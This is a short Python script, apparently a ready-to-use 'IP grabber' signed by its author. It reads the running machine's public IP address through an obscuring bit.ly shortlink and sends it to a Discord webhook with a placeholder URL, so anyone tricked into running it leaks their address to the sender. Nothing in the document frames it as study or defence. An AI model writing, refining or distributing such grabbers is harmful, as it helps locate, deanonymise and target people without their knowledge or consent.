import requests 
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen


webhookurl = 'WEBHOOK-HERE'


ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
#bitly      -->      https://api.ipify.org/

# Sends the ip to an webhook
webhook = DiscordWebhook(url=f'{webhookurl}', content=f'Ip adress: {ip} \n\nMade by Cuet#1337')
response = webhook.execute()
# Ending.
#
# Created by Cuet#1337
#
#